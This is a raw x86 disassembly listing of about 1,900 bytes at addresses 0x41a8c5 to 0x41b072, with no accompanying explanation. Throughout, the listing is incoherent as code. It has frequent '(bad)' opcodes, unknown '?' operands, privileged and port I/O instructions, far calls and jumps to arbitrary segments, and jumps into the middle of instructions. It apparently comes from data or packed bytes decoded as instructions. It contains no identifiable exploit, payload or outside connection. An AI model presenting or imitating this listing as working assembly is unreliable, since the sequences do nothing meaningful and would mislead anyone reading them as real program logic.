  41a8c5:	arpl   WORD PTR [edx-0x3e],si
  41a8c8:	add    edi,edi
  41a8ca:	push   ds
  41a8cb:	jge    0x41a84f
  41a8cd:	pop    edx
  41a8ce:	dec    esp
  41a8cf:	cmp    edi,edx
  41a8d1:	mov    edi,0xe1417ebc
  41a8d6:	push   ebp
  41a8d7:	jecxz  0x41a8f9
  41a8d9:	bound  esp,QWORD PTR [eax-0x3fd2a290]
  41a8df:	scas   eax,DWORD PTR es:[edi]
  41a8e0:	punpckldq mm4,DWORD PTR [ebx+edx*8-0x7c]
  41a8e5:	add    BYTE PTR ds:0xb3eb800,cl
  41a8eb:	sub    al,BYTE PTR [ebx+0x5f]
  41a8ee:	jp     0x41a8bf
  41a8f0:	call   DWORD PTR [edx]
  41a8f2:	rol    BYTE PTR [esi+0x11],0xa7
  41a8f6:	dec    cx
  41a8f8:	sub    BYTE PTR [edx+eax*8-0x7cb62d72],dl
  41a8ff:	sub    DWORD PTR [esi-0x6b],esp
  41a902:	sbb    DWORD PTR [ebp-0x2f94a7c8],ebp
  41a908:	cdq    
  41a909:	shl    al,cl
  41a90b:	ds loopne 0x41a93e
  41a90e:	push   eax
  41a90f:	nop
  41a910:	pusha  
  41a911:	inc    edi
  41a912:	and    al,0x4a
  41a914:	push   eax
  41a915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a916:	dec    eax
  41a917:	adc    al,0x93
  41a919:	mov    ah,0x5d
  41a91b:	or     esp,ebp
  41a91d:	inc    esp
  41a91e:	scas   al,BYTE PTR es:[edi]
  41a91f:	push   edi
  41a920:	fdiv   st(2),st
  41a922:	(bad)  
  41a923:	call   0x2204ea7
  41a928:	(bad)  
  41a929:	and    BYTE PTR [edx-0x1d],dl
  41a92c:	outs   dx,DWORD PTR ds:[si]
  41a92e:	and    al,0x91
  41a930:	les    ecx,FWORD PTR [esi+0x34]
  41a933:	in     eax,dx
  41a934:	xchg   ecx,eax
  41a935:	and    al,0xa5
  41a937:	add    al,0xfe
  41a939:	js     0x41a911
  41a93b:	ror    DWORD PTR [ebp+0x71e557ec],1
  41a941:	dec    eax
  41a942:	aam    0xb9
  41a944:	jecxz  0x41a96f
  41a946:	ror    ah,1
  41a948:	call   0xcbf7:0x816bdae4
  41a94f:	popa   
  41a950:	jno    0x41a8e6
  41a952:	mov    WORD PTR [eax],cs
  41a954:	addr16 retf 
  41a956:	mov    cl,0xec
  41a958:	lds    ebp,FWORD PTR [edx]
  41a95a:	stc    
  41a95b:	call   0x223ec0bd
  41a960:	push   0xfffffffb
  41a962:	mov    ds:0x9b70b2f2,al
  41a967:	shr    eax,0x52
  41a96a:	push   ecx
  41a96b:	mov    WORD PTR [ebp+eiz*2+0x3b116fe3],?
  41a972:	cdq    
  41a973:	ja     0x41a920
  41a975:	adc    esi,ebx
  41a977:	dec    ecx
  41a978:	jecxz  0x41a9a3
  41a97a:	data16 fdivr QWORD PTR [ecx-0x490e9e9a]
  41a981:	push   esi
  41a982:	daa    
  41a983:	xor    BYTE PTR [edx-0x5943652],ah
  41a989:	loopne 0x41a932
  41a98b:	or     eax,0xff4b7552
  41a990:	mov    edx,0x74f55939
  41a995:	fsubr  DWORD PTR ds:0x8e539a9c
  41a99b:	test   eax,0x87f50de1
  41a9a0:	nop
  41a9a1:	pusha  
  41a9a2:	(bad)  
  41a9a3:	call   0x1ad4:0x8f2ef6d9
  41a9aa:	cmp    eax,0xd32b1042
  41a9af:	cs sti 
  41a9b1:	aas    
  41a9b2:	xlat   BYTE PTR ds:[ebx]
  41a9b3:	sbb    dl,bl
  41a9b5:	cmp    eax,0xe1159d56
  41a9ba:	xor    DWORD PTR [ecx],ebp
  41a9bc:	inc    esp
  41a9bd:	jno    0x41a967
  41a9bf:	jnp    0x41a998
  41a9c1:	in     eax,0xda
  41a9c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9c4:	mul    DWORD PTR [eax+0x5c6dfdff]
  41a9ca:	hlt    
  41a9cb:	in     eax,dx
  41a9cc:	ss mov cl,0x68
  41a9cf:	cs jb  0x41a9db
  41a9d2:	adc    bl,0x94
  41a9d5:	dec    eax
  41a9d6:	jb     0x41a9a0
  41a9d8:	test   DWORD PTR [ecx+0x7b43f6b3],eax
  41a9de:	call   0xebb0:0x2bec4129
  41a9e5:	pop    edi
  41a9e6:	bound  eax,QWORD PTR [eax+ecx*1+0x3c29bbd7]
  41a9ed:	div    esp
  41a9ef:	ret    0xdd9f
  41a9f2:	add    al,0xa0
  41a9f4:	adc    DWORD PTR [edx+0x54164292],ecx
  41a9fa:	cmp    al,BYTE PTR ds:[esi+0x442c8b6f]
  41aa01:	sar    ebp,1
  41aa03:	retf   
  41aa04:	sbb    bl,BYTE PTR [edx+0x34]
  41aa07:	or     esi,DWORD PTR [ecx+ebx*2+0x7e18d536]
  41aa0e:	paddb  mm1,QWORD PTR [ecx-0x1f]
  41aa12:	mov    WORD PTR [edx+esi*4],?
  41aa15:	popf   
  41aa16:	shufps xmm7,XMMWORD PTR [ebx-0x32],0x5f
  41aa1b:	aas    
  41aa1c:	iret   
  41aa1d:	xchg   ebp,eax
  41aa1e:	(bad)  [eax]
  41aa20:	fadd   st(0),st
  41aa22:	test   BYTE PTR [ebp-0x163250f3],cl
  41aa28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa29:	mov    BYTE PTR [esi+0x1faf2da1],cl
  41aa2f:	fs fcmovne st,st(6)
  41aa32:	mov    al,ds:0x78e4be57
  41aa37:	aam    0x5a
  41aa39:	add    esp,DWORD PTR [esi-0x727c70c3]
  41aa3f:	icebp  
  41aa40:	mov    eax,ds:0x7c70966b
  41aa45:	retf   
  41aa46:	jae    0x41aa59
  41aa48:	cmc    
  41aa49:	inc    edx
  41aa4a:	xor    bh,ch
  41aa4c:	test   eax,0x4c2def83
  41aa51:	cs std 
  41aa53:	in     al,dx
  41aa54:	cmp    dl,BYTE PTR [eax+0x59]
  41aa57:	or     ebx,ebp
  41aa59:	pop    eax
  41aa5a:	loope  0x41aa1f
  41aa5c:	cmp    DWORD PTR [di+0x45],esi
  41aa60:	inc    ecx
  41aa61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa63:	cmp    BYTE PTR ds:0x5d279824,al
  41aa69:	mov    ebx,0xacedffc7
  41aa6e:	outs   dx,BYTE PTR ds:[esi]
  41aa6f:	and    esp,esi
  41aa71:	iret   
  41aa72:	push   edx
  41aa74:	sar    BYTE PTR [edi-0x78],cl
  41aa77:	lods   eax,DWORD PTR ds:[esi]
  41aa78:	xchg   ebp,eax
  41aa79:	ins    DWORD PTR es:[edi],dx
  41aa7a:	push   esp
  41aa7b:	jg     0x41aa16
  41aa7d:	aam    0xf1
  41aa7f:	btc    DWORD PTR [edx],ecx
  41aa82:	stos   DWORD PTR es:[edi],eax
  41aa83:	(bad)  
  41aa84:	scas   eax,DWORD PTR es:[edi]
  41aa85:	dec    ebp
  41aa86:	xor    DWORD PTR [ebx-0x7c],edx
  41aa89:	add    BYTE PTR [ebx],cl
  41aa8b:	imul   eax,DWORD PTR [edx],0xbc13ee7d
  41aa91:	stos   DWORD PTR es:[edi],eax
  41aa92:	xchg   esp,eax
  41aa93:	xchg   ebx,eax
  41aa94:	out    0x5d,al
  41aa96:	sbb    dh,0xbd
  41aa99:	stos   BYTE PTR es:[edi],al
  41aa9a:	(bad)  
  41aa9b:	and    al,0xb2
  41aa9d:	jbe    0x41aaca
  41aa9f:	mov    ebp,DWORD PTR [edx]
  41aaa1:	ficom  DWORD PTR [ecx+0x4c63da16]
  41aaa7:	xor    edi,DWORD PTR ds:0x3d3c2761
  41aaad:	xchg   esp,eax
  41aaae:	adc    bl,BYTE PTR [eax+0x6f7466c6]
  41aab4:	lea    ecx,[eax+0x4d900b16]
  41aaba:	in     eax,0x28
  41aabc:	mov    eax,ds:0x40c499f
  41aac1:	fst    DWORD PTR [eax-0x3d]
  41aac4:	es sub eax,0x310ced5c
  41aaca:	lahf   
  41aacb:	lods   eax,DWORD PTR ds:[esi]
  41aacc:	jo     0x41aacc
  41aace:	pop    es
  41aacf:	mov    ebx,0x8506510
  41aad4:	cli    
  41aad5:	mov    dl,ah
  41aad7:	jmp    ecx
  41aad9:	add    cl,bh
  41aadb:	mov    al,0x68
  41aadd:	mov    al,0x3d
  41aadf:	(bad)  
  41aae0:	and    al,bl
  41aae2:	sbb    al,0xd6
  41aae4:	lods   al,BYTE PTR ds:[esi]
  41aae5:	ror    edi,1
  41aae7:	jecxz  0x41aaee
  41aae9:	popa   
  41aaea:	xor    DWORD PTR [eax-0x4706d105],ebx
  41aaf0:	test   BYTE PTR [ecx-0x75],0x53
  41aaf4:	jae    0x41ab15
  41aaf6:	fist   DWORD PTR ds:0x25a1818c
  41aafc:	mov    dh,0x71
  41aafe:	push   edx
  41aaff:	xchg   edx,eax
  41ab00:	mov    eax,ds:0xf7b736e3
  41ab05:	pop    ebp
  41ab06:	mov    ?,WORD PTR [ebx-0xb32391a]
  41ab0c:	or     BYTE PTR [ebx+0x7b7217e6],ah
  41ab12:	dec    edi
  41ab13:	pop    ebx
  41ab14:	dec    ebp
  41ab15:	lock (bad) 
  41ab17:	jmp    FWORD PTR [edx-0x59df95a8]
  41ab1d:	daa    
  41ab1e:	pop    ds
  41ab1f:	or     ebp,esp
  41ab21:	int3   
  41ab22:	js     0x41ab56
  41ab24:	jno    0x41aaf9
  41ab26:	leave  
  41ab27:	mov    bl,0x21
  41ab29:	test   eax,0x37580ff5
  41ab2e:	sbb    cl,ch
  41ab30:	add    DWORD PTR [ebx],edi
  41ab32:	inc    ebx
  41ab33:	scas   al,BYTE PTR es:[edi]
  41ab34:	nop
  41ab35:	aas    
  41ab36:	mov    ds:0xa47bc098,eax
  41ab3b:	(bad)
  41ab3e:	pop    esp
  41ab3f:	mov    bl,0x39
  41ab41:	mov    al,0xbb
  41ab43:	sub    dh,BYTE PTR ss:[edi+edi*4+0x71b2153c]
  41ab4b:	add    dh,dh
  41ab4d:	adc    al,0x2e
  41ab4f:	ins    DWORD PTR es:[edi],dx
  41ab50:	out    0xc9,eax
  41ab52:	daa    
  41ab53:	mov    dh,0x58
  41ab55:	sahf   
  41ab56:	mov    DWORD PTR [ecx+ebp*2],ecx
  41ab59:	imul   eax,edi,0xe82cd7b1
  41ab5f:	test   eax,0xec30fb7f
  41ab64:	js     0x41ab65
  41ab66:	jle    0x41ab6f
  41ab68:	pushf  
  41ab69:	lock xchg BYTE PTR [ecx-0x36b27df9],bl
  41ab70:	pop    ds
  41ab71:	loope  0x41ab74
  41ab73:	jns    0x41ab20
  41ab75:	add    DWORD PTR [ebx+0x2aec95c],ebp
  41ab7b:	aas    
  41ab7c:	sub    DWORD PTR [ebx+0x77c27efb],esi
  41ab82:	adc    al,0x37
  41ab84:	and    edi,ebp
  41ab86:	sub    al,0x9b
  41ab88:	(bad)  
  41ab89:	(bad)  
  41ab8a:	fwait
  41ab8b:	stc    
  41ab8c:	mov    fs,WORD PTR [edx]
  41ab8e:	sub    BYTE PTR ds:0x584c444f,ch
  41ab94:	push   es
  41ab95:	sub    edi,ebx
  41ab97:	sbb    eax,0x763dfed9
  41ab9c:	sbb    BYTE PTR [edi+0x709f6283],cl
  41aba2:	sbb    eax,0xc2ce3356
  41aba7:	outs   dx,DWORD PTR ds:[esi]
  41aba8:	sub    BYTE PTR [eax-0x193a324d],dh
  41abae:	jmp    0x41abc7
  41abb0:	or     al,0xb9
  41abb2:	(bad)  
  41abb3:	cli    
  41abb4:	cmp    DWORD PTR [ebp+0x10],0x8f46d290
  41abbb:	inc    edi
  41abbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abbd:	fisttp QWORD PTR [edi-0x5d]
  41abc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abc1:	lods   al,BYTE PTR ds:[esi]
  41abc2:	pop    ebp
  41abc3:	pop    ss
  41abc4:	push   ebp
  41abc5:	dec    ebx
  41abc6:	mov    ds:0xda8d35eb,eax
  41abcb:	mov    eax,0xaaa97117
  41abd0:	gs inc edi
  41abd2:	push   ebx
  41abd3:	sub    al,0x62
  41abd5:	les    ebx,FWORD PTR [edx+0x48]
  41abd8:	outs   dx,BYTE PTR ds:[esi]
  41abd9:	cmp    BYTE PTR [esp+edx*8+0x55],0x4a
  41abde:	lea    ebx,[eax]
  41abe0:	rol    BYTE PTR [eax+0x2a],1
  41abe3:	aas    
  41abe4:	mov    eax,0x67e06bea
  41abe9:	add    esi,DWORD PTR [edx-0x49]
  41abec:	mov    tr2,esp
  41abef:	fimul  WORD PTR [edx-0x3c]
  41abf2:	out    0x43,al
  41abf4:	imul   ecx,edi,0xc857e704
  41abfa:	test   eax,0x458335a0
  41abff:	push   es
  41ac00:	jecxz  0x41ac68
  41ac02:	xor    eax,0x625de95a
  41ac07:	lock mov ds:0x739f1bb,al
  41ac0d:	imul   esi,DWORD PTR cs:[ecx-0x5bea414a],0xffffffc5
  41ac15:	and    al,0x7c
  41ac17:	sbb    eax,0xa7c7f1d8
  41ac1c:	rol    DWORD PTR [ecx-0x14610b6f],1
  41ac22:	iret   
  41ac23:	mov    ebx,0xd770cbd9
  41ac28:	xchg   di,ax
  41ac2a:	or     dl,ah
  41ac2c:	loope  0x41ac24
  41ac2e:	sbb    DWORD PTR [edx-0x33],edx
  41ac31:	loope  0x41ac4d
  41ac33:	cld    
  41ac34:	pop    esi
  41ac35:	mov    bh,0x3d
  41ac37:	(bad)  
  41ac38:	xor    eax,0x8204c673
  41ac3d:	leave  
  41ac3e:	daa    
  41ac3f:	xchg   DWORD PTR [ebx],esi
  41ac41:	mov    cl,0x98
  41ac43:	pop    eax
  41ac44:	pop    DWORD PTR [eax]
  41ac46:	neg    BYTE PTR [esi-0x2c]
  41ac49:	cmp    BYTE PTR [esi+edx*8+0x68e5faa],dl
  41ac50:	cli    
  41ac51:	ret    0x31cf
  41ac54:	and    dh,dh
  41ac56:	fldlg2 
  41ac58:	jmp    0x909009b2
  41ac5d:	adc    esi,DWORD PTR [esi+0x3a]
  41ac60:	or     eax,0x43effb3b
  41ac65:	jo     0x41ac0f
  41ac67:	cmc    
  41ac68:	sbb    eax,0xb4158c5d
  41ac6d:	add    esp,DWORD PTR [ebp-0x3117730f]
  41ac73:	js     0x41ac46
  41ac75:	xchg   DWORD PTR [eax-0x1894445b],ebp
  41ac7b:	fsubr  st,st(6)
  41ac7d:	inc    edx
  41ac7e:	shl    BYTE PTR [esi],cl
  41ac80:	xchg   BYTE PTR [eax+edi*8],dh
  41ac83:	aad    0x7f
  41ac85:	repz sbb al,0xda
  41ac88:	pop    ds
  41ac89:	cmc    
  41ac8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac8b:	push   edi
  41ac8c:	sub    edx,DWORD PTR [ebp+0x46129b87]
  41ac92:	fsubr  st,st(4)
  41ac94:	pop    es
  41ac95:	sbb    BYTE PTR [edi+0x4],0x3e
  41ac99:	push   ebp
  41ac9a:	sub    dl,BYTE PTR [eax+eax*8+0x18713497]
  41aca1:	xor    al,dl
  41aca3:	xchg   DWORD PTR [ebx+0x3e22e425],esp
  41aca9:	xchg   ecx,eax
  41acaa:	sbb    eax,0x77ca3999
  41acaf:	cmp    bl,BYTE PTR [edi]
  41acb1:	push   ds
  41acb2:	mov    DWORD PTR [edx+0x17],ebp
  41acb5:	add    eax,DWORD PTR [ebp+ecx*2-0x3cb11660]
  41acbc:	sbb    DWORD PTR [eax],esp
  41acbe:	xchg   DWORD PTR [ebp+0x3],eax
  41acc1:	sub    al,bh
  41acc3:	rcl    DWORD PTR [ecx],0x40
  41acc6:	cmp    ah,BYTE PTR [esi+0x4a8686b7]
  41accc:	aas    
  41accd:	icebp  
  41acce:	xor    eax,0x1a256be9
  41acd3:	xor    eax,0x514c429f
  41acd8:	add    DWORD PTR ds:0xc392a144,0xffffffa0
  41acdf:	nop
  41ace0:	inc    edi
  41ace1:	fprem1 
  41ace3:	adc    DWORD PTR [edi],0x89e3c747
  41ace9:	inc    esp
  41acea:	and    DWORD PTR [edx+0x250c29d5],0xc4100d42
  41acf4:	jmp    0x41ad19
  41acf6:	test   DWORD PTR ds:[esi-0x773a04e1],edi
  41acfd:	scas   eax,DWORD PTR es:[edi]
  41acfe:	mov    al,0x3b
  41ad00:	cmp    eax,0xe93487cb
  41ad05:	add    BYTE PTR ds:0x7f9e9ffb,dl
  41ad0b:	fs pop ss
  41ad0d:	aas    
  41ad0e:	add    DWORD PTR [ebp-0x5de1712],esp
  41ad14:	in     eax,0x72
  41ad16:	lahf   
  41ad17:	rol    DWORD PTR ds:0xb7f1f638,0xf0
  41ad1e:	xchg   edi,eax
  41ad1f:	lods   eax,DWORD PTR ds:[esi]
  41ad20:	or     al,0x90
  41ad22:	sar    BYTE PTR [ecx+0x1c171181],cl
  41ad28:	retf   0x7295
  41ad2b:	sbb    cl,BYTE PTR [esi]
  41ad2d:	pop    esi
  41ad2e:	push   eax
  41ad2f:	pop    eax
  41ad30:	and    eax,0x69c76c56
  41ad35:	addr16 push esp
  41ad37:	test   ecx,0x7c3b0c91
  41ad3d:	inc    ebx
  41ad3e:	and    esp,DWORD PTR [esi-0x46268ccf]
  41ad44:	jmp    0xec71:0x85d3fb91
  41ad4b:	popf   
  41ad4c:	jb     0x41acf1
  41ad4e:	retf   
  41ad4f:	leave  
  41ad50:	stos   BYTE PTR es:[edi],al
  41ad51:	test   al,0x27
  41ad53:	sti    
  41ad54:	pop    ss
  41ad55:	fistp  QWORD PTR [ecx]
  41ad57:	cs push 0x27
  41ad5a:	sbb    eax,0xa98edd46
  41ad5f:	and    DWORD PTR [edx-0x71],0xffffffc7
  41ad63:	aad    0x0
  41ad65:	fiadd  WORD PTR [eax-0x13]
  41ad68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad69:	push   edi
  41ad6a:	push   ds
  41ad6b:	fild   QWORD PTR [eax]
  41ad6d:	sbb    al,0xee
  41ad6f:	loopne 0x41ad59
  41ad71:	push   0xffffffac
  41ad73:	cwde   
  41ad74:	dec    esp
  41ad75:	pop    edx
  41ad76:	jg     0x41ad15
  41ad78:	mov    edi,0x192c2e8f
  41ad7d:	repz scas eax,DWORD PTR es:[edi]
  41ad7f:	jp     0x41adb4
  41ad81:	sub    eax,0x5531f9c4
  41ad86:	cwde   
  41ad87:	mov    bh,al
  41ad89:	ss stos DWORD PTR es:[edi],eax
  41ad8b:	xchg   edi,eax
  41ad8c:	xor    DWORD PTR [edx+ebp*8],ebx
  41ad8f:	jmp    0x774:0x6ec11d79
  41ad96:	xchg   BYTE PTR [edx+0x24],al
  41ad99:	mov    DWORD PTR [eax+0x3b999efe],eax
  41ad9f:	inc    edx
  41ada0:	leave  
  41ada1:	mov    esi,0xd35ff502
  41ada6:	mov    al,0x58
  41ada8:	and    eax,0x33dca73
  41adad:	enter  0x3c1c,0x3
  41adb1:	cmp    eax,0xbc3c02b4
  41adb6:	push   edi
  41adb7:	call   FWORD PTR [ecx+0x39]
  41adba:	shr    DWORD PTR [edx],0x96
  41adbd:	push   0x91563faa
  41adc2:	add    DWORD PTR [edx+ebx*8+0xab95c31],0x5
  41adca:	rcl    DWORD PTR [eax+0x5817f017],0xc2
  41add1:	hlt    
  41add2:	cwde   
  41add3:	jnp    0x41adfb
  41add5:	push   0xffffffa4
  41add7:	aaa    
  41add8:	inc    eax
  41add9:	push   ecx
  41adda:	inc    eax
  41addb:	mov    ch,0xca
  41addd:	mov    es,WORD PTR [edx-0x7b]
  41ade0:	and    ch,BYTE PTR [edi-0x7d]
  41ade3:	xchg   DWORD PTR [eax-0x3d],eax
  41ade6:	scas   eax,DWORD PTR es:[edi]
  41ade7:	ret    
  41ade8:	push   edi
  41ade9:	or     DWORD PTR [edx+esi*4-0x1f],ebx
  41aded:	push   esi
  41adee:	jno    0x41ad70
  41adf0:	dec    edx
  41adf1:	cdq    
  41adf2:	aaa    
  41adf3:	push   ds
  41adf4:	adc    ebx,DWORD PTR [eax]
  41adf6:	stos   BYTE PTR es:[edi],al
  41adf7:	loop   0x41ae15
  41adf9:	sti    
  41adfa:	cmp    al,0x3d
  41adfc:	fistp  QWORD PTR [ecx]
  41adfe:	sub    dl,BYTE PTR [esi]
  41ae00:	jl     0x41adfe
  41ae02:	pop    esi
  41ae03:	clc    
  41ae04:	sub    bl,BYTE PTR [ebp+0x45]
  41ae07:	sub    eax,0xc7dee42
  41ae0c:	cmp    eax,0xc6f1db66
  41ae11:	test   eax,0x8df4c612
  41ae16:	(bad)  
  41ae17:	(bad)  
  41ae18:	push   esi
  41ae19:	std    
  41ae1a:	vmwrite esi,DWORD PTR [eax+eiz*4+0x7fc3f9ed]
  41ae22:	fwait
  41ae23:	pop    ebp
  41ae24:	mov    dh,BYTE PTR ds:0x4004913f
  41ae2a:	in     al,0x62
  41ae2c:	ror    DWORD PTR [edx+eiz*1+0x53],0x20
  41ae31:	adc    eax,0x615310c8
  41ae36:	dec    ebx
  41ae37:	stos   DWORD PTR es:[edi],eax
  41ae38:	push   edx
  41ae39:	fcmovb st,st(6)
  41ae3b:	adc    ecx,esi
  41ae3d:	repz add esi,edx
  41ae40:	lock or esp,ecx
  41ae43:	adc    eax,0xb3265373
  41ae48:	pop    edi
  41ae49:	out    dx,eax
  41ae4a:	push   cs
  41ae4b:	cmp    BYTE PTR [edx-0x789fa318],ah
  41ae51:	mov    WORD PTR [ebp+0x652f6a18],fs
  41ae57:	dec    eax
  41ae58:	repz inc esi
  41ae5a:	shl    BYTE PTR [ebx],1
  41ae5c:	cli    
  41ae5d:	pop    esp
  41ae5e:	in     al,dx
  41ae5f:	aam    0xe3
  41ae61:	loope  0x41aed5
  41ae63:	xchg   esp,eax
  41ae64:	imul   eax,DWORD PTR [ebx-0x74],0xcf1c63fb
  41ae6b:	mov    ds:0x165572bd,eax
  41ae70:	pop    ebx
  41ae71:	test   DWORD PTR [eax],esp
  41ae73:	inc    edx
  41ae74:	int    0xbd
  41ae76:	ins    BYTE PTR es:[edi],dx
  41ae77:	daa    
  41ae78:	inc    edi
  41ae79:	add    BYTE PTR [ebx],bl
  41ae7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae7c:	fdivr  st,st(2)
  41ae7e:	push   edi
  41ae7f:	mov    cx,0x7a03
  41ae83:	mov    ds:0x42ea0740,eax
  41ae88:	inc    esp
  41ae89:	out    0x95,al
  41ae8b:	(bad)  
  41ae8c:	dec    esp
  41ae8d:	pop    ebp
  41ae8e:	(bad)  
  41ae90:	test   BYTE PTR [edi+0x77d7fb0a],0xf
  41ae97:	or     BYTE PTR [ebx],al
  41ae99:	mov    dh,0x5c
  41ae9b:	ret    
  41ae9c:	not    DWORD PTR [ecx-0x16]
  41ae9f:	xor    bh,bh
  41aea1:	mov    eax,ds:0x40cb4c6f
  41aea6:	inc    esi
  41aea7:	ja     0x41aef0
  41aea9:	inc    esp
  41aeaa:	push   ecx
  41aeab:	sub    al,0xbd
  41aead:	or     BYTE PTR [esi-0x7b8207e0],0xf4
  41aeb4:	arpl   bp,si
  41aeb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeb7:	adc    edx,DWORD PTR [ebx]
  41aeb9:	mov    dl,0x4b
  41aebb:	aas    
  41aebc:	fs imul esi
  41aebf:	xchg   DWORD PTR [edi+0x15],esi
  41aec2:	push   ebp
  41aec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec4:	push   cx
  41aec6:	mov    ebp,0xfe494671
  41aecb:	je     0x41ae84
  41aecd:	popf   
  41aece:	mov    al,0x89
  41aed0:	jmp    0xb08cacd
  41aed5:	call   DWORD PTR [esi]
  41aed7:	(bad)  
  41aed8:	jmp    0xe12ac435
  41aedd:	repz pop eax
  41aedf:	lahf   
  41aee0:	stc    
  41aee1:	test   BYTE PTR [esp+eax*2+0x140dcfe1],0xba
  41aee9:	enter  0xbfd2,0x44
  41aeed:	fst    QWORD PTR [esi]
  41aeef:	or     BYTE PTR ds:0xba6e9f13,bh
  41aef5:	dec    esi
  41aef6:	xor    BYTE PTR [eax+0x575fbf21],0x5b
  41aefd:	mov    ds:0x2465afd7,al
  41af02:	cmp    esp,ecx
  41af04:	push   0x34bd07b0
  41af09:	ror    BYTE PTR [ebx-0x2e],0x78
  41af0d:	dec    ebp
  41af0e:	mov    al,0x2f
  41af10:	mov    dh,0xfa
  41af12:	sahf   
  41af13:	add    bl,dh
  41af15:	fist   DWORD PTR ds:0x31327b02
  41af1b:	outs   dx,BYTE PTR ds:[esi]
  41af1c:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af1e:	jmp    0xe276e61c
  41af23:	dec    edx
  41af24:	push   0x9f58bf3
  41af29:	nop
  41af2a:	and    eax,0xf5c71126
  41af2f:	pop    es
  41af30:	mov    bh,0x20
  41af32:	jno    0x41af99
  41af34:	mov    DWORD PTR [ebx+ebx*1-0x7415ab8d],edi
  41af3b:	loope  0x41aed8
  41af3d:	daa    
  41af3e:	aad    0x68
  41af40:	inc    esp
  41af41:	lods   al,BYTE PTR ds:[esi]
  41af42:	jns    0x41af07
  41af44:	cld    
  41af45:	push   0xffffffac
  41af47:	mov    ebx,0x4940e171
  41af4c:	mov    WORD PTR [eax+eax*1-0x36],gs
  41af50:	stc    
  41af51:	pop    esi
  41af52:	adc    al,0x16
  41af54:	cdq    
  41af55:	out    dx,eax
  41af56:	js     0x41af45
  41af58:	cs aad 0x7b
  41af5b:	jae    0x41af24
  41af5d:	adc    ch,BYTE PTR [ecx+eiz*4+0x53529fac]
  41af64:	and    BYTE PTR [esi+eax*1],bl
  41af67:	inc    ebp
  41af68:	dec    ebx
  41af69:	sub    al,0xc9
  41af6c:	call   0x65d2:0xc650968d
  41af73:	dec    esi
  41af74:	retf   
  41af75:	sub    edi,esp
  41af77:	mov    ah,0x45
  41af79:	in     al,dx
  41af7a:	lds    ecx,FWORD PTR [esi]
  41af7c:	and    BYTE PTR [ebp-0x36],bl
  41af7f:	xchg   ebp,eax
  41af80:	push   ds
  41af81:	sahf   
  41af82:	shl    esi,cl
  41af84:	pop    edx
  41af85:	mov    dl,0x93
  41af87:	test   BYTE PTR [ecx],cl
  41af89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af8a:	jae    0x41af7c
  41af8c:	mov    ch,0x7b
  41af8e:	push   edx
  41af8f:	dec    ebp
  41af90:	mov    ds:0xa9370d6a,eax
  41af95:	xor    DWORD PTR [ecx-0x20a6a0e0],0xffffff83
  41af9c:	out    dx,al
  41af9d:	push   ds
  41af9e:	sub    eax,0x310bb2cd
  41afa3:	call   0xde48b1ab
  41afa8:	jb     0x41af9e
  41afaa:	outs   dx,DWORD PTR ds:[esi]
  41afab:	push   cs
  41afac:	icebp  
  41afad:	fdivr  DWORD PTR [edi]
  41afaf:	xor    edx,DWORD PTR [esi-0x79e943a1]
  41afb5:	jge    0x41af6b
  41afb7:	fld    DWORD PTR gs:[ecx+ebp*2]
  41afbb:	add    DWORD PTR [edx+ecx*2],ebp
  41afbe:	mov    esp,0x5c771a62
  41afc3:	mov    esp,0xfc2b76b1
  41afc8:	cmp    al,al
  41afca:	int    0xc7
  41afcc:	sub    eax,0xa78e5acb
  41afd1:	fwait
  41afd2:	xor    bl,BYTE PTR ds:0x2ead3440
  41afd8:	mov    dh,0xa9
  41afda:	push   ss
  41afdb:	pop    ds
  41afdc:	add    esi,DWORD PTR [edi-0x19]
  41afdf:	xor    BYTE PTR [ecx-0x7992a03b],bh
  41afe5:	pop    esp
  41afe7:	mov    ch,0x3d
  41afe9:	(bad)  
  41afea:	test   DWORD PTR [eax+edi*8+0x1f4d6b2b],edx
  41aff1:	adc    BYTE PTR [ebx+0x21aa5693],0x93
  41aff8:	in     al,0xd8
  41affa:	sbb    ah,ah
  41affc:	(bad)  
  41affd:	mov    al,ds:0xe1936bfb
  41b002:	scas   al,BYTE PTR es:[edi]
  41b003:	mov    bl,0xc9
  41b005:	outs   dx,BYTE PTR ds:[esi]
  41b006:	pop    ss
  41b007:	popf   
  41b008:	aam    0xc2
  41b00a:	mov    al,ds:0x9ed50fd5
  41b00f:	pop    edi
  41b010:	ror    DWORD PTR [edi-0x6fd565bf],cl
  41b016:	push   ecx
  41b017:	enter  0x42e9,0xf5
  41b01b:	jb     0x41b096
  41b01d:	pop    ds
  41b01e:	push   esp
  41b01f:	inc    edi
  41b020:	inc    ecx
  41b021:	mov    bh,0xe
  41b023:	mov    edx,0x77a2ebea
  41b028:	sbb    al,0xe2
  41b02a:	dec    eax
  41b02b:	mov    eax,ds:0x537000d6
  41b030:	or     esp,ebp
  41b032:	iret   
  41b033:	sub    DWORD PTR [esi+ecx*2-0x477750a5],eax
  41b03a:	or     DWORD PTR [ecx-0x14],esp
  41b03d:	popf   
  41b03e:	pop    es
  41b03f:	push   ebp
  41b040:	sbb    eax,0x99a03ca0
  41b045:	add    BYTE PTR [eax+edi*1+0x3d],ch
  41b049:	mov    ch,0x32
  41b04b:	mov    esi,0xe1c46664
  41b050:	sub    dl,0x8d
  41b053:	jne    0x41b0d2
  41b055:	aas    
  41b056:	jns    0x41b07e
  41b058:	push   edi
  41b059:	jne    0x41b04a
  41b05b:	sti    
  41b05c:	test   al,0x2e
  41b05e:	xchg   edi,eax
  41b05f:	inc    esi
  41b060:	fisttp DWORD PTR [ebp+0x40]
  41b063:	aad    0x4e
  41b065:	cmp    DWORD PTR ds:0xb1550c6f,edi
  41b06b:	out    dx,al
  41b06c:	lock add eax,0x212430a7
  41b072:	push   ecx
